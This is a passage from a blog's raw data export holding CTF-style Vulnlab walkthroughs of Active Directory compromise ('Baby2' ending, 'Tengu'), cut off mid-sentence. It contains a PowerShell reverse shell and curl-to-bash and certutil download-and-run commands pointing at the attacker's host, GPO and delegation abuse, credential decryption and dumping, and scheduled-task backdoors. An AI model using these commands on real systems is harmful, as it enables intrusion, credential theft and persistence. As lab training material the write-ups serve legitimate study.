<code>revshell.txt</code> and the LPORT for it is <code>9002</code>, which will point to a netcat listener.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$LHOST = &quot;10.8.0.173&quot;; $LPORT = 9002; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = [...snip...]$StreamWriter.Write(&quot;$Output`n&quot;); $Code = $null &#125; &#125;; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()</span><br></pre></td></tr></table></figure>\n\n<p>You can generate a similar one from <a href=\"https://www.revshells.com/\">revshells.com</a>, that’s essentially all you’ll need.</p>\n<p>So now all that’s left to do is to delete the existing <code>login.vbs</code> script is <code>SYSVOL</code> and add our modified script to it.</p>\n<p>We’ll also stand up two listeners, one being a Python HTTP server and another being a netcat listener.<br><code>python3 -m http.server 9001</code><br><code>nc -lvnp 9002</code></p>\n<p><code>smbclient -c &#39;cd \\baby2.vl\\scripts\\; rm login.vbs; put login.vbs&#39; \\\\\\\\10.10.102.12\\\\SYSVOL -U &#39;library&#39;</code></p>\n<p>After about a minute or two of waiting, we can see that our file was grabbed by the remote machine from our webserver.<br><code>10.10.102.12 - - [21/May/2024 14:16:02] &quot;GET /revshell.txt HTTP/1.1&quot; 200 -</code></p>\n<p>And we can also see that our reverse shell was executed, and we now have a shell as <code>amelia.griffiths</code>.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/e.jpg\"></p>\n<h1 id=\"Host-Reconnaissance\"><a href=\"#Host-Reconnaissance\" class=\"headerlink\" title=\"Host Reconnaissance\"></a>Host Reconnaissance</h1><p>The user flag was not in it’s ordinary location, which usually is <code>C:\\Users\\(user)\\Desktop\\user.txt</code>, however I found that it was just within the root <code>C:\\</code> drive denoted as <code>C:\\users.txt</code>. This means we have conquered the first half of the machine!</p>\n<p>From here I decided to stand up a Sliver server and ran an implant so I could get an easier shell, since the shell that we landed with is very barebones. I’ve done this before in a few of my other writeups - essentially all I’m doing is starting a listener, generate an implant, and running the implant on the remote machine to receive a session. You can find all the documentation needed to do the above steps <a href=\"https://github.com/BishopFox/sliver\">here</a>.</p>\n<p>So from here we’ll need to move around the domain using our permissions. I couldn’t find specifically anything that <code>Amelia.Griffiths</code> could do from Bloodhound, nor did their permissions seem to be out of the ordinary.</p>\n<p>However you’ll notice that if you run <code>whoami /all</code> with our user, you’ll find that they are a part of two groups that are not regularly enabled by default.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">BABY2\\office    Group            S-1-5-21-213243958-1766259620-4276976267-1104 Mandatory group, Enabled by default, Enabled group</span><br><span class=\"line\">BABY2\\legacy    Group            S-1-5-21-213243958-1766259620-4276976267-2601 Mandatory group, Enabled by default, Enabled group</span><br></pre></td></tr></table></figure>\n\n<p>We can look at both the groups in Bloodhound to see if they have any abnormally configured outbound object controls. The office group didn’t seem to have anything out of the ordinary, however the focal point for our attack path seems to rely on two of the outbound object controls that the <code>legacy</code> group has.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/f.jpg\"></p>\n<h1 id=\"GPO-Object-Control\"><a href=\"#GPO-Object-Control\" class=\"headerlink\" title=\"GPO Object Control\"></a>GPO Object Control</h1><p>It seems that <code>Amelia.Griffiths</code> (who is within the <code>legacy</code> group) has <code>WriteOwner</code> on both the GPO-Management OU and the <code>gpoadm</code> user. To give context on how this works, <code>WriteOwner</code> essentially allows our user to modify the ownership of the object. If we can change the ownership of this object, then we can make the owner of it ourselves. And from there, our ability to abuse the GPOs can allow us to add a new DA of our choosing.</p>\n<p>Furthermore, we can see that the <code>gpoadm</code> user has GenericAll on two GPOs that we can use to create said DAs.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/g.jpg\"></p>\n<p>Not only that, but if we verify who the <code>gpoadm</code> account belongs to by running the below command, we can see that it is controlled by the Domain Admins group.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\amelia.griffiths\\Desktop&gt; Get-ADUser gpoadm | ForEach-Object &#123;Get-ACL &quot;AD:\\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BABY2\\Domain Admins</span><br></pre></td></tr></table></figure>\n\n<p>So to start, let’s use <code>PowerView</code> to change the owner of the <code>gpoadm</code> user to <code>Amelia.Griffiths</code> using a built-in cmdlet.<br><code>PS C:\\Users\\amelia.griffiths\\Desktop&gt; Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths</code></p>\n<p>If we run the above <code>Get-ADUser</code> command that we ran earlier, we can see that the owner of the <code>gpoadm</code> account has been changed.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\amelia.griffiths\\Desktop&gt; Get-ADUser gpoadm | ForEach-Object &#123;Get-ACL &quot;AD:\\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BABY2\\Amelia.Griffiths</span><br></pre></td></tr></table></figure>\n\n<p>Afterwards, we can then add a new ruleset, or ACL, to the <code>gpoadm</code> user to give ourselves GenericAll on the account.<br><code>PS C:\\Users\\amelia.griffiths\\Desktop&gt; Add-DomainObjectACL -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All</code></p>\n<p>This in theory should now allow for us to do a multitude of different attacks, most notably changing the users password. While I normally wouldn’t do this in a red-team environment, this should be alright since we’re in a lab.</p>\n<p>That being said, if you do want a little pointer on what you could do that could help keep a low-profile, make sure to check out xct’s writeup on this machine <a href=\"https://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab\">here</a> (timestamp is 9:08). He utilizes Whisker and Rubeus to create a TGT that essentially acts like a backdoor, allowing you to create shadow credentials that you can use to always be able to log into the box. This can continue to work even if the user changes their password and does NOT change the user’s password.</p>\n<p>Not only that, you can also use the dumped hash that Rubeus will provide in PTH (Pass-the-Hash).</p>\n<p>We could reupload a new Bloodhound dump, but I already know that we have GenericAll on this user. We’d normally be able to use <code>bloodyAD</code> to change the user’s passwords, but that requires us to have valid credentials to <code>Amelia.Griffiths</code>, which we don’t have.</p>\n<p>Luckily enough there is a Window alternative that we can do within our shell as <code>Amelia.Griffiths</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\amelia.griffiths\\Desktop&gt; $newcred = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\amelia.griffiths\\Desktop&gt; Set-DomainUserPassword gpoadm -AccountPassword $cred</span><br></pre></td></tr></table></figure>\n\n<p>There was no error output, thus we can confirm that the user password for <code>gpoadm</code> has been successfully changed. We can verify this in crackmapexec, but to prevent clutter on the writeup I’ll just show a quick screenshot of it.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/h.jpg\"></p>\n<h1 id=\"GPO-Abuse-as-gpoadm\"><a href=\"#GPO-Abuse-as-gpoadm\" class=\"headerlink\" title=\"GPO Abuse as gpoadm\"></a>GPO Abuse as gpoadm</h1><p>Now, we should be able to abuse either of the two GPOs that <code>gpoadm</code> has control over. We can verify these two GPOs that we saw in our Bloodhound output by running the <code>Get-GPO</code> cmdlet in <code>PowerView</code>.<br><code>PS C:\\Users\\amelia.griffiths\\Desktop&gt; Get-GPO -all</code></p>\n<p>This should return both GPOs that we saw previously, the <code>Default Domain Policy</code> and the <code>Default Domain Controllers Policy</code>.<br>It doesn’t really matter which one we try to abuse, so I’ll use the <code>Default Domain Controllers Policy</code>.</p>\n<p>We can use <code>pyGPOAbuse</code> to essentially automate the exploitation of this GPO. What this tool will do is modify the GPO to create a scheduled task and execute a respective command that will give us a DA to authenticate as. <a href=\"https://github.com/Hackndo/pyGPOAbuse\">https://github.com/Hackndo/pyGPOAbuse</a></p>\n<p>By default, <code>pyGPOAbuse</code> will create a user under the context of <code>john:H4x00r123..</code>, we can also opt to specify a command to be more silent however this is all we’ll probably need for this lab.<br><code>python3 pyGPOAbuse/pygpoabuse.py -dc-ip 10.10.104.215 -gpo-id &quot;6ac1786c-016f-11d2-945f-00c04fb984f9&quot; baby2.vl/gpoadm:&#39;Password123!&#39;</code></p>\n<p>This should create the scheduled task, which will potentially take a while to run.<br>We can circumvent this by forcing the GPO service to restart by running <code>gpupdate /force</code>.</p>\n<p>Now we can test our credentials that the GPO abuse created for us, being <code>john:H4x00r123..</code><br><code>crackmapexec winrm 10.10.104.215 -u &#39;john&#39; -p &#39;H4x00r123..&#39;</code></p>\n<p><img src=\"/images/vulnlab/baby2-vl/i.jpg\"></p>\n<p>Thus, if we log into the WinRM service using <code>evil-winrm</code>, we should be able to authenticate properly.<br><code>evil-winrm -i 10.10.104.215 -u &#39;john&#39; -p &#39;H4x00r123..&#39;</code></p>\n<p><img src=\"/images/vulnlab/baby2-vl/j.jpg\"></p>\n<p>We can now see that we DA privileges since we have all of the permissions listed within <code>whoami /priv</code>.<br>This allows us to read the contents of the Administrator directory and read the root flag, meaning we have completed this machine!</p>\n<p>The root flag is within <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>I plan on also making a research post about GPO abuse and getting into the nitty gritties of how to exploit it manually rather than doing it through <code>pyGPOAbuse</code>, which from what I’m expecting will probably be through <code>RPCClient</code>. Though I could be wrong. Nonetheless again, big thanks to xct for creating this machine - it definitely helped with a lot of practice and hopefully this writeup did the same for any readers.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab\">https://www.youtube.com/watch?v=a97PMfOXitY&amp;t=788s&amp;ab_channel=vulnlab</a><br><a href=\"https://github.com/Hackndo/pyGPOAbuse\">https://github.com/Hackndo/pyGPOAbuse</a></p>\n"},{"title":"Tengu - Vulnlab","date":"2024-06-05T20:27:23.000Z","keywords":"Vulnlab, Medium, Linux, Windows","description":"This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.","cover":"/images/vulnlab/tengu-vl/tengu_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis was my first step into a three-machine chain on VulnLab, and I want to thank r0BIT on the development of this chain and all of the work that was developed for this chain. It involves exploiting a domain-joined Linux machine and pivoting through MSSQL, finally leading to the DC after.\n\n# Enumeration\n\nUpon doing our first scans, we can see that there are three machines that collectively have either RDP or SSH on them. There's also another port on `.183` denoted as `VSAT-CONTROL` on port 1880, though this seems to be the only other port that is available.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:01 EDT\nNmap scan report for 10.10.187.181\nHost is up (0.11s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 22.28 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:01 EDT\nNmap scan report for 10.10.187.182\nHost is up (0.11s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 22.45 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:02 EDT\nNmap scan report for 10.10.187.183\nHost is up (0.11s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n1880/tcp open  vsat-control\n\nNmap done: 1 IP address (1 host up) scanned in 15.46 seconds\n```\n\nUsually these chains start with the machine that has the highest number in the IP address, being `.183` in our case. We'll try to look into these a little more to see if there are any other services. We can start by examining the `vsat-control` service, as I've found that it's being hosted on a front-end web application.\n\n# Node-RED RCE\n\nUpon accessing the website, we can see that we are greeted with the `Node-RED` service.\n\n![](/images/vulnlab/tengu-vl/b.jpg)\n\nThis seems to be interconnected with an `MSSQL` service, however I'm assuming that the databases are only accessible on the back-end, since we did not see them on our initial scan.\n\nNode-RED seems to be a programming tool for wiring APIs and devices together through a centralized service. The interface that we are currently interacting with is a flow diagram to which maps out different services in a stream-lined fashion. This specific web application seems to utilize JavaScript functions within the flow diagram editor for easier template and function usage. The most up-to-date version of Node-RED seems to be v3.1.9, however you'll notice from the menu that we're currently on v3.1.6.\n\nA good way to think about this is that you can map the connections between devices and how they're used. It's essentially like drawing diagrams in Paint or Microsoft Visio, except those figures that you use are services and web-apps. The application itself is publicly accessible since it does not enforce any form of authentication into the web service.\n\nIn the flow diagram that we have access to, there are four different figures for us to look at; `timestamp`, `SQL`, `Pull_Data`, and `/tmp/output`. We also see underneath the `SQL` node that there seems to be a connection error between this web service and `sql.tengu.vl:1433`, which my guess is the domain name of one of the machines. I've done some research and found that MSSQL can run on Linux (which is the OS of the machine we're on), though most don't recommend it in a production environment.\n\nI found some resources about this specific service and how to exploit it, notably by `qkaiser` in [this article](https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/). This involves utilizing the `exec` node to trigger arbitrary command execution through the debug console.\n\nTo test this functionality, I spun up a simple Python server on my localhost with `http://(IP):9001/` and created a node flow that executed an arbitrary command via the `exec` and `debug` nodes. To test this, I just had the `exec`  node make a request with `curl` towards our Python server.\n\n![](/images/vulnlab/tengu-vl/c.jpg)\n\nUpon saving our changes and deploying the flow diagram, we'll run our nodes to execute the command, which we can see runs successfully in based on the captured request.\n\n![](/images/vulnlab/tengu-vl/d.jpg)\n\nNow that we verified that we have remote code execution, we can attempt to execute a payload. `qkaiser` developed a proof-of-concept that we can utilize to get remote code execution, which you can find in the article I have referenced above.\n\nThe proof-of-concept itself seems to be explained thoroughly, as it essentially checks if there are any authentication requirements such as using credentials or requiring a token to the service to run. If those checks are passed, it will perform the following:\n\n* Create a timestamp node and attach an exec block to it.\n* Listen for any requests through a web socket\n* Execute the exec block and catch the web socket request after it is triggered.\n* Provide a terminal UI that allows us to interact with the reverse shell when it is generated.\n\nThe only requirement we need to provide the proof-of-concept with is the URL to the web service (since there is no authentication required on our behalf).\n\n![](/images/vulnlab/tengu-vl/e.jpg)\n\nThe socket that opens up for us seems to have some odd behavior, so I decided to set up a simple reverse shell and use `curl http:(IP):(PORT)/rev.sh | bash` to this machine to execute (I used [revshells](https://www.revshells.com/) for `rev.sh` which just as a bash one-liner). You can do what you'd like, however this seemed to work for me - which afterwards I stood up a [Sliver](https://github.com/BishopFox/sliver) server and executed an implant which would provide me with a Sliver session on the remote host.\n\n(Note that the file named `tengu` is my sliver implant)\n\n# NODERED$ Host Reconnaissance\n\n![](/images/vulnlab/tengu-vl/f.jpg)\n\nSo this user seems to have their own home directory, however I noticed that there is no user flag in their home folder. This means we'll need to escalate our privileges to the next user in order to do this.\n\nI immediately started to look into the `.node-red` directory, as it seems to be the only unusual file in the users home folder. This directory housed a file that we can use to potentially escalate privileges - `flows_cred.json`.\n\n# Decrypting Flow Creds\n\nThere is a hash in `flows_cred.json` that is unrecognized by tools like `hashcat` and `JTR`, so we'll need to decrypt them in some way. Doing some research into this file led me to discover that there is a key for this hash located within `.config.runtime.json` (I used [this article](https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/) as reference for how to decrypt it). Essentially the key within the config file is hashed with SHA256 and is passed into the `decryptCredentials()` function, to which the key is then used to alter the first 32 characters of the hash.\n\nThe proof-of-concept provided in the article decrypts the hash using `openssl` and reconverts the first 32 characters that have been altered by the respective function. I did some altering to the proof-of-concept that it provided, and ran it locally as the `jq` dependency was not available on the remote host. (All credit for the below code goes to HugoPoi in their article and for the development of the code.)\n\n```\n└─$ cat dec_flow_creds.sh      \n#!/bin/bash\n#\n# Decrypt flows_cred.json from a NodeRED data directory\n#\n# Usage\n# ./node-red-decrypt-flows-cred.sh ./node_red_data\n#\njq  '.[\"$\"]' -j $1flows_cred.json | \\\n  cut -c 33- | \\\n  openssl enc -aes-256-ctr -d -base64 -A -iv `jq  -r '.[\"$\"]' $1flows_cred.json | cut -c 1-32` -K `jq -j '._credentialSecret' $1.config.runtime.json | sha256sum | cut -c 1-64`\n```\n\nThis leaves us with the following response after decrypting the hash.\n\n```\n└─$ ./dec_flow_creds.sh       \n{\"d237b4c16a396b9e\":{\"username\":\"nodered_connector\",\"password\":\"[...snip...]\"}}\n```\n\nWe have found creds for a user, however you'll notice that this does not seem to belong to a user on the host machine. The only other user that we are able to authenticate to is `labadmin`, who probably has the user flag within their home folder.\n\n# Enabling MSSQL Database Connection on NODERED$\n\nI checked for credential reusage for any of the users through SSH or RDP on the other machines, however came back with no results. Given the name of the user `nodered_connector`, we can guess that these creds still belong to the Node-RED service.\n\nIf we remember originally from the start of the box, there was an MSSQL node that was failing from one of the flow diagrams in Node-RED. If we take a look back at this, we can edit the SQL node information and we'll find the same `nodered_connector` auto-filled into the credential option for this node. Entering our creds into this will cause the node error to disappear after deploying the diagram.\n\n![](/images/vulnlab/tengu-vl/g.jpg)\n\nFrom here, we can determine whether or not we can access the MSSQL database by setting up a SOCKS proxy on the `.183` machine we have access to. Sliver has a built-in SOCKS5 proxy functionality, so we'll use that alongside `proxychains`.\n\n```\nsliver (tengu) > socks5 start\n\n[*] Started SOCKS5 127.0.0.1 1081\n```\n\nWe'll then need to change our `/etc/proxychains4.conf` file to reflect this SOCKS proxy and connect to it.\n\n```\n[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\nsocks5  127.0.0.1 1081\n```\n\nNow that we have access via the proxy, we can attempt to find the MSSQL service on `sql.tengu.vl` by trying to NMAP to all of the machines for it.\n* `proxychains4 nmap 10.10.187.183 -p1433 && proxychains4 nmap 10.10.187.182 -p1433 && proxychains4 nmap 10.10.187.183 -p1433`\n\nWe'll see that we receive a hit on `10.10.187.182`. This means we should be able to authenticate to MSSQL on `.182` with the `nodered_connector` creds that we have. We'll do so with Impacket.\n\n```\n└─$ proxychains4 impacket-mssqlclient -dc-ip 10.10.187.181 -target-ip 10.10.187.182 TENGU/'nodered_connector':'[...snip...]'@10.10.187.182\n```\n\n![](/images/vulnlab/tengu-vl/h.jpg)\n\n# MSSQL Database Enumeration\n\nNow that we have access to the MSSQL service, we can look around each database to find any credentials for any other users. This [HackTricks article](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) helped with utilizing a few MSSQL queries.\n\nIn the `Demo` database, there is a user hash for `t2_m.winters`. \n\n```\nSQL (nodered_connector  nodered_connector@Demo)> SELECT * FROM Users;\n  ID   Username          Password                                                              \n----   ---------------   -------------------------------------------------------------------   \nNULL   b't2_m.winters'   b'[...snip...]'\n```\n\nI couldn't find any success in using `JTR` or `Hashcat` with this hash, however I used the hash cracker on this [website](https://hashes.com/en/tools/hash_identifier) and found the respective credentials for this user.\n\nIf you'll notice in the `/home/tengu.vl` directory on the Linux machine, the user has a home folder within this directory. Even though this user is not within the `/etc/passwd` file (which would normally indicate to us that they are not an actual user on this system), we can still login as them using `su t2_m.winters` within the Linux machine.\n\n```\nnodered_svc@nodered:/tmp$ su t2_m.winters@tengu.vl\nPassword: \nt2_m.winters@tengu.vl@nodered:/tmp$\n```\n\nAfter logging in, we can see that we have permissions to run everything as root with `sudo -l` and `t2_m.winters` password. This means we can gain root access with `sudo su` and locate the first flag within `/root/root.txt`.\n\n# Pivoting to SQL$\n\nJust for some due diligence that I learned when doing the Hybrid chain a while back, I extracted `/etc/krb5.keytab` to my local machine and decrypted it using [KeyTabExtract](https://github.com/sosdave/KeyTabExtract). This will give us the NTLM hash of the `NODERED$` machine account.\n\n```\n[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.\n[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.\n[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.\n[+] Keytab File successfully imported.\n        REALM : TENGU.VL\n        SERVICE PRINCIPAL : NODERED$/\n        NTLM HASH : [...snip...]\n        AES-256 HASH : [...snip...]\n        AES-128 HASH : [...snip...]\n```\n\nWhether or not we'll need this is really up to the box. That being said, you'll notice on the Wiki that it's telling us to utilize delegation for our next vector. Originally I thought we'd do this to access `.182`, however it seems that machine was only used for the `MSSQL` purpose that we needed it for before, as it doesn't seem to have anything else useful for us right now.\n\nRunning `crackmapexec` through our DC seems to let us know that we have valid credentials to LDAP on the DC with `t2_m.winters`.\n\n```\n└─$ proxychains4 crackmapexec ldap 10.10.187.181 -u 't2_m.winters' -p '[...snip...]'                                              \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:389  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:135  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK\nSMB         10.10.187.181   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  DC.tengu.vl:389  ...  OK\nLDAP        10.10.187.181   389    DC               [+] tengu.vl\\t2_m.winters:[...snip...]\n```\n\nNote that I did take a break here for the day, so the IP addresses will change. The new chain addresses will vary.\n\nNow that we have valid credentials to LDAP as a user, we can dump the domain using [Bloodhound](https://github.com/dirkjanm/BloodHound.py).\n\nIn the Bloodhound GUI, I couldn't find anything out of the ordinary for the `t2_m.winters`. They are a valid user to the LDAP service on the DC, but they don't seem to have anything else. Let's take a look at the machine account `NODERED$` that we currently have an NTLM hash for.\n\n![](/images/vulnlab/tengu-vl/i.jpg)\n\n# ReadGMSAPassword on GMSA01$\n\nIt seems that our machine account `NODE-RED$` is a part of the `LINUX_SERVER` domain group, which has `ReadGMSAPassword` over `GMSA01$@tengu.vl`. This essentially means that we can read the respective password for this user as our `NODERED$` machine account. We can do so with crackmapexec.\n\n```\n└─$ proxychains4 crackmapexec ldap dc.tengu.vl -u 'NODERED$' -H [...snip...] --gmsa\n\nSMB         dc.tengu.vl     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  DC.tengu.vl:636  ...  OK\nLDAP        dc.tengu.vl     636    DC               [+] tengu.vl\\NODERED$:[...snip...] \nLDAP        dc.tengu.vl     636    DC               [*] Getting GMSA Passwords\nLDAP        dc.tengu.vl     636    DC               Account: gMSA01$              NTLM: [...snip...]\n```\n\nNow that we have credentials to this user, we can check what we can access to as this user in Bloodhound.\n\n![](/images/vulnlab/tengu-vl/j.jpg)\n\nOur user `GMSA01$`, has constrained delegation rights on the SQL machine, `sql.tengu.vl`. This means that we are allowed to authenticate as any user to specific services (more than likely MSSQL in our case) onto this machine. We can also impersonate domain admins, meaning that we can potentially compromise this entire host just from this privilege.\n\nThe victim in our case will be the SPN `MSSQLSvc/sql.tengu.vl` and will request a TGT for that SPN before using S4U2Self/S4U2Proxy to impersonate the user we are requesting for.\n\nNote that we won't be able to impersonate the Administrator as we only have an SPN for MSSQLSvc. You can verify the SPN by running LDAPSearch to query the domain with `t2_m.winters` credentials..\n\n```\n└─$ proxychains4 ldapsearch -LLL -x -H 'ldap://10.10.138.229' -D 't2_m.winters@tengu.v' -w 'Tengu123' -b \"dc=tengu,dc=vl\" \"(&(objectClass=User)(msDS-AllowedToDelegateTo=*))\"\n\n[...snip...]\nservicePrincipalName: MSSQLSvc/SQL.tengu.vl:1433\nservicePrincipalName: MSSQLSvc/SQL.tengu.vl\nobjectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configurat\n ion,DC=tengu,DC=vl\n [...snip...]\n```\n\nSo we'll need to find another user we can impersonate. If we had an SPN for CIFS, then we might be able to impersonate Administrator. That being said, if we look at the available users on `sql.tengu.vl`, we can try to find a few to impersonate.\n\n![](/images/vulnlab/tengu-vl/k.jpg)\n\nYou'll notice that there is a DA on this machine, though using `impacket-getST` does not let me impersonate them. this is due to them being within the `Protected Users` group, meaning we can not request a MSSQL service ticket as them.\n\nIf you didn't notice, there is an SQL Admins group that appear in the search bar. Investigating into this group gives me the impression that `t1_m.winters` is a valid user we can potentially try.\n\n```\n└─$ proxychains4 impacket-getST -spn 'MSSQLSvc/sql.tengu.vl' 'tengu.vl/GMSA01$@sql.tengu.vl' -hashes :[...snip...] -dc-ip 10.10.138.229 -impersonate 't1_m.winters'\n\n└─$ export KRB5CCNAME=t1_m.winters@MSSQLSvc_sql.tengu.vl@TENGU.VL.ccache\n\n└─$ proxychains4 impacket-mssqlclient -k sql.tengu.vl\nSQL (TENGU\\t1_m.winters  dbo@master)>\n```\n\n# SQL$ MSSQL XP Cmdshell\n\nWe are able to successfully authenticate as this user into the MSSQL service and can now enumerate a little further into what we can achieve. It seems that we have the ability to run commands if we use `enable_xp_cmdshell` and `xp_cmdshell`, which means we now have code execution on the second machine.\n\nI also tested for AMSI with `xp_cmdshell \"powershell -e SW52b2tlLU1pbWlrYXR6\"`, it seems that AV is not enabled on this machine. In that case we can try to curl our Sliver payload to this machine and execute it.\n\n```\nSQL (TENGU\\t1_m.winters  dbo@master)> xp_cmdshell powershell \"cd ..\\..; mkdir temp; cd C:\\temp; certutil.exe -urlcache -f http://10.8.0.173:9001/sql_tengu.exe sql_tengu.exe; .\\sql_tengu.exe\"\n```\n\nWe should now have proper code execution as the `gMSA01$` user, as denoted below.\n\n![](/images/vulnlab/tengu-vl/l.jpg)\n\n# Impersonating SYSTEM with SharpEfsPotato\n\nIf you'll notice, this user has `SeImpersonatePrivilege`, meaning we can impersonate SYSTEM and spawn a named pipe onto PowerShell, which we can then run our `sql_tengu` binary again to get a session as SYSTEM. We'll use [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) for this and can get a SYSTEM shell relatively easily. Note that I tried doing this through Sliver's UI, and was running into a token error. I dropped it locally to `sql.tengu.vl` and it seemed to work as intended.\n\n```\nPS C:\\temp> .\\SharpEfsPotato.exe -p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"cd C:\\temp; .\\sql_tengu.exe\" \n\nSharpEfsPotato by @bugch3ck\n  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.\n\n  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.\n\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/b9f1bb62-6bd4-4aa0-90d1-cca939fb5983/\\b9f1bb62-6bd4-4aa0-90d1-cca939fb5983\\b9f1bb62-6bd4-4aa0-90d1-cca939fb5983\ndf1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:\n[x]RpcBindingSetAuthInfo failed with status 0x6d3\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n[*] Session 2debc8b7 sql_tengu - 10.10.138.230:49693 (SQL) - windows/amd64 - Tue, 28 May 2024 14:34:18 EDT\n```\n\nWe can now view the second flag which is within `C:\\Users\\Administrator\\Desktop`.\n\n# Pivoting to the DC\n\nNow that we have a SYSTEM shell on this machine, we can essentially dump all credentials on this machine with [Mimikatz](https://github.com/ParrotSec/mimikatz). Before we do this though, I went to verify if there were any users that we could potentially look at to pivot to the DC.\n\n![](/images/vulnlab/tengu-vl/m.jpg)\n\nIt seems that `T0_C.FOWLER` can do this, who is also a part of the `T0_Admins` domain group. If we are able to get their credentials, we may be able to authenticate to the DC and go from there. I also reset my SOCKS5 proxy to the SYSTEM session that we have right now just for due diligence, it shouldn't really matter that much as far as I'm concerned.\n\n# Scheduled Task Exploitation\n\nDoing some enumeration, I couldn't find much with PowerView. I then moved onto scheduled tasks, which showed some promise. Enumerating scheduled tasks can be done with the following: `schtasks /query /v /fo LIST > tasklist.txt` \n\n![](/images/vulnlab/tengu-vl/n.jpg)\n\nThere's a task file denoted as `C:\\admin\\Task.ps1` that seems to be ran as `t0_c.fowler`, which is the user we are trying to escalate as. If we plant a reverse shell or attempt to execute our Sliver binary, we should be able to get a session as this user once this task is executed. (I just added `Start-Process \"C:\\temp\\sql_tengu.exe\"` to the bottom of the file.)\n\nYou'll notice though that this task is being ran once every day. We'll need to speed this up. We can do so by forcing Task Scheduler to restart the task, by executing: `Get-ScheduledTask -TaskName \"Daily_Checkup\" | Start-ScheduledTask`\n\nAfter waiting about a minute, we should get a new session as `c.fowler`.\n\n![](/images/vulnlab/tengu-vl/o.jpg)\n\nNow that we are 